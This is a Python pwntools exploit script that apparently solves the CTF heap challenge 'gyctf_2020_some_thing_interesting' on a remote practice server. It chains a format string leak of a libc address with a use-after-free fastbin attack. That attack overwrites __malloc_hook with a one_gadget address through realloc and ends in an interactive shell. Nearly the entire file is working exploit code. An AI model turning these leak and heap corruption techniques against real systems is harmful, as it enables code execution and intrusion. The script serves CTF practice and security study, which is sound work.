#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.arch = 'amd64'


local = 0
if local == 1:
    r=process('./gyctf_2020_some_thing_interesting')
    gdb.attach(r,"b * $rebase(0xF63)")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r = remote('node4.buuoj.cn',29012)
    libc = ELF('libc-2.23-0ubuntu11.so')

elf= ELF('./gyctf_2020_some_thing_interesting')

def add(size,content,size2,content2):
    r.recvuntil('ant to do :')
    r.sendline('1')
    r.recvuntil('length :')
    r.sendline(str(size))
    r.recvuntil('O :')
    r.send(content)
    r.recvuntil('length :')
    r.sendline(str(size2))
    r.recvuntil('RE :')
    r.send(content2)

def edit(index,content1,content2):
    r.recvuntil('ant to do :')
    r.sendline('2')
    r.recvuntil('Oreo ID : ')
    r.sendline(str(index))
    r.recvuntil('O :')
    r.send(content1)
    r.recvuntil('RE :')
    r.send(content2)

def dele(index):
    r.recvuntil('ant to do :')
    r.sendline('3')
    r.recvuntil('Oreo ID : ')
    r.sendline(str(index))

def show(index):
    r.recvuntil('ant to do :')
    r.sendline('4')
    r.recvuntil('Oreo ID : ')
    r.sendline(str(index))

r.recvuntil('ode please:')
r.send('OreOOrereOOreO%17$p')

r.recvuntil('ant to do :')
r.sendline('0')
r.recvuntil('OreOOrereOOreO')
lsmr = int(r.recv(14),16)
log.success("libc_start_main_ret:"+hex(lsmr))
libc_addr = lsmr-0x020830
log.success("libc_addr:"+hex(libc_addr))
malloc_hook = libc_addr + libc.symbols['__malloc_hook']
realloc = libc_addr + libc.symbols['realloc']
ogg = libc_addr +0x4526a
add(0x68,'aaaa',0x68,'bbbb')
dele(1)
edit(1,p64(0xdeadbeef),p64(malloc_hook-0x23))

add(0x68,'aaaa',0x68,cyclic(11)+p64(ogg)+p64(realloc+12))
#add(0x68,'aaaa',0x68,'bbbb')

r.recvuntil('ant to do :')
r.sendline('1')
r.recvuntil('length :')
r.sendline('96')

r.interactive()
#0x7fe5e682d620
